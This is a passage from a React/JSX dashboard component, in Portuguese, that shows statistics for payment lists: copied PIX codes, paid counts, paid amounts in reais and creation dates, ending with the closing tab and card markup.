                            <p className="text-xl font-bold text-purple-600">{list.pix_copiados}</p>
                            <p className="text-xs text-purple-800">PIX Copiados</p>
                          </div>
                          <div className="bg-green-50 rounded-lg p-3">
                            <p className="text-xl font-bold text-green-600">{list.total_paid || 0}</p>
                            <p className="text-xs text-green-800">Pagos</p>
                            {list.total_amount_paid > 0 && (
                              <p className="text-xs font-semibold text-green-700 mt-1">
                                R$ {(list.total_amount_paid / 100).toFixed(2)}
                              </p>
                            )}
                          </div>
                        </div>
                        <p className="text-xs text-gray-500">
                          Criada em: {new Date(list.created_at).toLocaleDateString("pt-BR")}
                        </p>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}
